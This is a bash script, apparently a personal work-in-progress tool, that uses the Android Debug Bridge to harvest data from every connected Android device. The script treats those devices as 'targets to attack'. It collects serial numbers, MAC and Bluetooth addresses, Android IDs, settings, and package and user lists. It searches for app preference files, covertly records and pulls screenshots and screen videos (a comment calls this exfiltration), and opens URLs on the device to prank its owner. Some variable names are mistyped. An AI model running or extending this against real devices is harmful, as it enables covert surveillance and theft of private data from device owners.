#!/bin/bash

###
# The purpose of this script is to perform OSINT on an Android Device via the Android Debug Bridge (ADB)
#
# Author:		Paul A. Wortman
# Last Edit:		2022-06-13
###

### Rough Change Log / ToDo List
# [ ]	Build basic structure of the script
# [ ]	Recognize if there are any existing ADB devices seen
# [ ]	Get debugging print out an information set on the script
# [ ]	Start with basic system information output
#
#
#	https://www.shell-tips.com/bash/arrays/
#

### Notes:
# First Format:				function_name () {
#						commands
#					}
# Single Line Version:			function_name () { commands; }
# Second Format:			function function_name {
#						commands
#					}
# Single Line Version:			function function_name { commands; }

### Globals
debugBit=0

### Functions
function intro_information {
	echo -e "-----------------------------------------------------------------------------------------------"
	echo -e "	Android Debugging Bridge	-	OSINT Searching Tool				"
	echo -e "	------------------------------------------------------------				"
	echo -e "												"
	echo -e " Usage:	./osintADB.sh	< osint storage directoy > < device Id >			"
	echo -e "	-> Note: If no Device ID is provided, then the script will attempt to locate		"
	echo -e "			the appropriate device candidates					"
	echo -e " The purpose of this tool is to gather information on Android devices, connected to via adb	"
	echo -e "												"
	echo -e "-----------------------------------------------------------------------------------------------"
}

function osint_explore_adb_target {
	local var adb_target_id=$1
	echo -e "================================================================================"
	echo -e "[*] Collecting information on the ADB Android Target ID\t-\t[\t$adb_target_id\t]"
	echo -e "--------------------------------------------------------------------------------"
	echo -e "[*] Gathering Android System Properties Information"
	# Print out Device Property Information (Formatted Summary type output)
	echo -e "Device Property Summary Information:"
	echo -e "\tSDK Build Version:			$(adb -s $adb_target_id shell getprop ro.build.verison.sdk)"
	echo -e "\tSecurity Patch Build Version:	$(adb -s $adb_target_id shell getprop ro.build.version.security_patch)"
	echo -e "\tBoard Platform:			$(adb -s $adb_target_id shell getprop ro.board.platform)"
	echo -e "\tRelease Build Version:		$(adb -s $adb_target_id shell getprop ro.build.version.release)"
	echo -e "\tVendor Product Model:		$(adb -s $adb_target_id shell getprop ro.vendor.product.model)"
	echo -e "\tProduct Manufacturer:		$(adb -s $adb_target_id shell getprop ro.product.manufacturer)"
	echo -e "\tSerial Number:			$(adb -s $adb_target_id shell getprop ro.serialno)"
	echo -e "\tOEM Unlock Supported:		$(adb -s $adb_target_id shell getprop ro.oem_unlock_supported)"
	echo -e "\tBoot Image Build Fingerprint:	$(adb -s $adb_target_id shell getprop ro.bootimage.build.fingerprint)"
	echo -e "\tBoot WiFi MAC Address:		$(adb -s $adb_target_id shell getprop ro.boot.wifimacaddr)"
	echo -e "\tDevice net.dns1:"
	adb -s $adb_target_id shell getprop net.dns1
	echo -e "\tDevice net.dns2:"
	echo -e "[*] Gathering Android Settings System Information"
	# Print out System Settings Information
	echo -e "\tSystem Settings Information:" 
	adb -s $adb_target_id shell settings list system
	# Print out System Volume Information
	echo -e "\tSystem Volume Information:"
	adb -s $adb_target_id shell settings get system volume_system
	# Print out System Notificaiton Sound Information
	echo -e "\tSystme Notificaiton Sound Information:"
	adb -s $adb_target_id shell settings get system notificaiton_sound
	# Print out Secure Settings Information
	echo -e "\tSecure Settings Information:"
	adb -s $adb_target_id shell settings list secure
	# Print Secure Android ID (Device ID)
	echo -e "\tSecure Android / Device ID:"
	adb -s $adb_target_id shell settings get secure android_id
	# Print Device Bluetooth Address
	echo -e "\tDevice Bluetooth Address:"
	adb -s $adb_target_id shell settings get secure bluetooth_address
	# Print Global Settings
	echo -e "\tGlobal Settings Information:"
	adb -s $adb_target_id shell settings list global
	# Print Device Mobile Data Status
	echo -e "\tDevice Mobile Data Status Information:"
	adb -s $adb_target_id shell settings get global mobile_data
	# Print Current WiFi Status
	echo -e "\tCurrent Device WiFi Status Information:"
	adb -s $adb_target_id shell settings get global wifi_on
	echo -e "--------------------------------------------------------------------------------"
	echo -e "\tInternal Device Testing"
	## TODO: Add in commands to attempt screen control, take screenshots, and then exfiltrate
	# Use screenrecord, screencap, then 'adb pull' the file; default location: /sdcard/<filename>
	echo -e "[*] Attempting Screen Capture and Recordings of Android Device"
	echo -e "\tScreen Capture being Attempted...."
	adb -s $adb_target_id shell screencap /sdcard/screen.png
	adb -s $adb_target_id shell pull /sdcard/screen.png $osint_directory_location
	echo -e "\tAttempting Screen Recording...."
	adb -s $adb_target_id shell screenrecord /sdcard/demo.mp4
	adb -s $adb_target_id shell pull /sdcard/demo.mp4 $osint_directory_location
	adb -s $adb_target_id shell getprop net.dns2
	echo -e "[*] Gathering Activity Manager (AM) Information"
	#adb -s $adb_target_id shell am 
	echo -e "[*] Gathering Package Manager (PM) Information"
	# Print Packages of the System
	adb -s $adb_target_id shell pm list packages
	# Print Features of the System
	echo -e "\tFeatures of the System Information:"
	adb -s $adb_target_id shell pm list features
	# Print System Permissions
	echo -e "\tList of the Known Permissions:"
	adb -s $adb_target_id shell pm list permissions
	# Print System Libraries
	echo -e "\tList of the Known Libraries:"
	adb -s $adb_target_id shell pm list libraries
	# Print System Users
	echo -e "\tList of the Known Users:"
	adb -s $adb_target_id shell pm list users
	# Print Test of All Packages
	echo -e "\tResults of Testing all Packages"
	adb -s $adb_target_id shell pm list instrumentation
	echo -e "[*] Gathering Device Policy Manager (DPM) Informaiton"
	# End of the Search Output
	echo -e "================================================================================"
}

# Function for sending an ADB shell command to a remote target
function send_remote_adb_shell_command {
	# Placing the function input into a local variable array for easier work 
	local var function_input=($@)
	#local var adb_target_id=$0
	# Note: The adb_target_id is going to be item ZERO of the function_input array
	local var adb_target_id=${function_input[0]}
	#local var abd_command=$:2
	# Note: The rest of the function_input (minus the ZEROTH ELEMENT) are the commands to be run
	local var adb_command=${function_input[@]:1}
	#echo -e "Input to Function:\t$@"
	#echo -e "Input to Function (with arrays):\t${function_input[*]}"
	# Testing for loop
	#for value in "$@"; do echo -e "\tItem:\t$value"; done
	#echo -e "\tPrint Rest of array ${'$@':2}"
	#echo -e "\tPrint Rest of Array ${function_input[@]}"
	# Debugging line for this function
	echo -e "\tADB Target:\t[\t$adb_target_id\t]\n\tADB Command:\t[\t$adb_command\t]\n\tFull Command:\t adb -s $adb_target_id shell $adb_command"
	# Send the command
	adb -s $adb_target_id shell $adb_command
}

# Function for extracting a given file < Target > to a given < Location >
function pull_remote_file_adb_shell {
	# Placing the function input into a local variable
	local var function_input=($@)
	# Extract the adb_target_id from the function input
	local var adb_target_id=${function_input[0]}
	# Extract the rest of the pull file < Target > and (if provided) < Location >
	local var adb_pull_target_and_location=${function_input[@]:1}
	# Debug output showing pull command sent
	echo -e "Input to Function:\t${function_input[*]}"
	echo -e "[*] Calling pull:\t$adb_pull_target_and_location\n\tADB Target:\t[ $adb_target_id ]\n\tFull Command:\tadb -s $adb_target_id pull $adb_pull_target_and_location"
	# Pull the file using provided command
	adb -s $adb_target_id pull $abd_pull_target_and_location
}

# Function for Searching Known Directories on Android Device
function search_for_interesting_files {
	# Placing the function input into a local variable
	local var function_input=($@)
	# Extract the adb_target_id from the function input
	local var adb_target_id=${function_input[0]}
	# Extract the rest of the function inputs
	local var adb_rest_of_inputs=${function_intput[@]:1}
	# Start searching for the 'shared_prefs' file
	echo -e "[*] Searching for the location of the 'shared_prefs' file"
	send_remote_adb_shell_command $adb_target_id find / -iname 'shared_prefs' 2>/dev/null
	# Search and return the contents of the '/data/local/tmp'; since this is a good location to find information, even if there is no SD Card
	echo -e "[*] Searching for data in /data/local/tmp directory"
	send_remote_adb_shell_command $adb_target_id ls -lah /data/local/tmp
}

# Function for testing shell interaction with the target android id
function test_shell_interaction {
	local var adb_target_id=$1
	local var adb_pull_location_directory=$2
	local var screen_recording_filename="general_screen_recording_0001.mp4"
	local var work_profile_screen_recording_filename="work_profile_screen_recording_0001.mp4"
	local var android_device_screen_recording_directory="/sdcard/"
	# Note: The below value is in seconds; the default for time limit is 180 seconds (three minutes), unless specified
	local var screen_record_time_limit=120
	echo -e "================================================================================"
	echo -e "[*] Testing Interaction with the ADB Android Target ID\t-\t[\t$adb_target_id\t]"
	echo -e "--------------------------------------------------------------------------------"
	echo -e "Input to Function:\t$@"
	echo -e "[*] Attempt to move the status bar up and down"
	# Testing opening and closing the Android Status Bar
	send_remote_adb_shell_command $adb_target_id service call statusbar 1
	sleep 0.5
	send_remote_adb_shell_command $adb_target_id service call statusbar 2
	sleep 0.5
	## Try to open a web browser
	echo -e "[*] Attempt to Rick Roll the User"
	# Go back to home
	send_remote_adb_shell_command $adb_target_id input keyevent 3
	sleep 1
	# Open a web browser
	#send_remote_adb_shell_command $adb_target_id input keyevent 64
	#sleep 2
	# Highlight the Web URL Bar
	#send_remote_adb_shell_command $adb_target_id input keyevent 
	# Open Browser with Specific URL via Activity Manager
	send_remote_adb_shell_command $adb_target_id am start -a android.intent.action.VIEW -d https://www.youtube.com/watch?v=dQw4w9WgXcQ
	## Begin Screen Recording / Capture Testing
	echo -e "[*] Beginning Generic Screen Recording..."
	# Screen capture (time is in seconds?)
	send_remote_adb_shell_command $adb_target_id screenrecord --time-limit $screen_record_time_limit $android_device_screen_recording_directory$screen_recording_filename
	sleep 120
	#adb -s $adb_target_id pull /sdcard/screenrecord-003.mp4 ./.
	# Note: Below the addition of the '/' character seems to be how to differentiate between two bash variables; BUT NOT with the screenrecord commands?? Why....
	#	-> Maybe not???
	pull_remote_file_adb_shell $adb_target_id $android_device_screen_recording_directory$screen_recording_filename $adb_pull_location_directory
	echo -e "[*] Beginning Work Profile Screen Recording...."
	send_remote_adb_shell_command $adb_target_id screenrecord --time-limit $screen_record_time_limit $android_device_screen_recording_directory$work_profile_screen_recording_filename
	sleep $screen_record_time_limit
	pull_remote_file_adb_shell $adb_target_id $android_device_screen_recording_directory$work_profile_screen_recording_filename $adb_pull_location_directory
	#adb -s $adb_target_id 
}

## Sub-list of Functions Purely for the Sake of Pranking / Annoying the User

# Function for testing forced beahvior of the device
#	- Examples include: going to the Home screen, forcing the screen to close, open different audio files, open specific packages

### Main Script

## Check to see if any function variables were passed with the script
if [[ $# -eq 0 ]]; then
	intro_information
	#exit 1
elif [[ $# -eq 1 ]]; then
	echo -e "Searching for OSINT Storage Directory $1"
elif [[ $# -eq 2 ]]; then
	echo -e "Searching for OSINT Storage Directory $1"
	echo -e "Searching for Device ID $2"
else
	echo -e "Received too many arguments....."
	exit 2
fi

## Check if the adb server is running
#	- Note: Check using the 'ps -C adb' command
if ps -C adb | grep -q adb; then
	echo -e "[+] Confirmed that ADB is currently running... Do not need to start up the server"
else
	echo -e "[-] ADB server is not currently running... Starting up server"
	adb start-server
	echo -e "[+] ADB server has been started"
fi

## TODO: Check if the provided storage directory exists
osint_directory_location=$1
# Check that the first variable was not empty
if [[ ! -z "$osint_directory_location" ]]; then 
	echo -e "[+] User Provided an OSINT Storage Directory"
else
	echo -e "[-] User has not provided an OSINT Storage Directory"
	exit 3
fi
# Check that the OSINT Storage Directory actually exists or not
if [[ ! -d $osint_directory_location ]]; then
	echo -e "[-] Provided OSINT Storage Directory does NOT exist..."
	exit 4
else
	echo -e "[+] Confirmed existence of OSINT Storage Directoy [ $osint_directory_location ]"
fi

## Check for any existing devices
if [[ -n $(adb devices -l | tail -n +2) ]]; then		# Note: The check here relies on the adb server having been started
	echo -e "Non-empty string was returned"
	potential_adb_targets="$(adb devices -l | tail -n +2)"
else
	echo -e "Empty string was returned"
	#potential_adb_targets="$(adb devices -l | tail -n +2)"
	echo -e "[-] No potential targets to attack present.... Exiting script"
	exit 3
fi

## Begin querying the potential ADB targets
# Setup the IFS (Field Separator) to a new line character
IFS=$'\n'
# Loop through the potential ADB targets
echo -e "Loop of Target Gathering:"
for adb_target in $potential_adb_targets; do
	echo -e "Potential Target:\t$adb_target"
	adb_target_id=$(echo $adb_target | cut -d' ' -f1)
	# Full OSINT of the ADB Target ID
	#osint_explore_adb_target $adb_target_id
	# Testing Return of Network Information
	#send_remote_adb_shell_command $adb_target_id ip addr show
	# Call to the test interaction function
	test_shell_interaction $adb_target_id $osint_directory_location
done


## Shutdown the adb server
echo -e "Shutting down ADB server...."
adb kill-server
echo -e "[+] ADB Server shut down"
